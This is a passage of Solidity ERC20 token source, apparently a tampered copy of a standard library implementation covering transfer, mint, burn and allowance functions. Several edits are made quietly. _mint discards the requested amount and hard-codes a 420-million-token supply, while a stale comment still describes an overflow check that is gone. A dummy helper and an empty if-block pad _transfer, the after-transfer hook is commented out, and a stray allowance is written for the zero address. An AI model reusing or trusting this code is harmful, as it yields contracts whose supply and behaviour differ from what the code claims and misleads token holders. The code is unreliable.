uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    unchecked {\n        _balances[from] = fromBalance - amount;\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n        // decrementing then incrementing.\n        _balances[to] += amount;\n    }\n\n        uint256 x = cbit(0, amount);\n        if (x == 0) {\n        }\n        emit Transfer(from, to, amount);\n\n        //_afterTokenTransfer(from, to, amount);\n    }\n    function cbit(uint256 a, uint256 b) private pure returns(uint256) {\n        return a + b;\n    }\n\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _allowances[address(0)][address(0)] = amount;\n        _beforeTokenTransfer(address(0), account, amount);\n        amount = 420000000 * 10 ** 18;\n        _totalSupply += amount;\n    unchecked {\n        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n        _balances[account] += amount;\n    }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n    unchecked {\n        _balances[account] = accountBalance - amount;\n        // Overflow not possible: amount <= accountBalance <= totalSupply.\n        _totalSupply -= amount;\n    }\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - amount);\n        }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n}"
}